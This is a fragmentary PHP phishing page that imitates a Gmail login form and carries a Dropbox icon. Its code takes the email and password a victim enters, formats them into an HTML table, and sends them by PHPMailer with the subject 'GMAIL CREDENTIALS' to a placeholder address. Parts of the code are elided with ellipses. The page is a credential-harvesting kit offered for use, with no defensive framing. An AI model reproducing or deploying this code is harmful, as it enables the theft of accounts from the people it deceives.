      ...
      $_SESSION['login_attempts']++;
        ...
        if (!empty($email) && !empty($password)) {
               ...
               <table style='width:100%; border-collapse:collapse;'>
                  <thead>
                        <tr style='background-color:#4CAF50; color:white;'>
                           <th style='padding:10px; border:1px solid #ddd;'>Gmail Address</th>
            ...
            // Create a new PHPMailer instance
               ...
               $mail->Password = ''; // SMTP oassword
               $mail->SMTPSecure = 'tls';   
               $mail->Port = 587;  
               // $mail->SMTPSecure = 'ssl';   
               // $mail->Port = 465;  
               $mail->setFrom($email, 'Annonymous'); 
               $mail->addAddress('demo@exmaple.com',"Details");   
   
               // Email content
               $mail->isHTML(true);
               $mail->Subject = 'GMAIL CREDENTIALS';
               $mail->Body = $result;
    ...
    <div class="zhico"><br>
       <form action="" method="post">
        <img class="imgg" width="70px" height="70px" src="./266593_dropbox_icon.png" alt="">
           <h3 align="center" class="h3">Login with your Gmail</h3>
           <br>
           <div class="label">
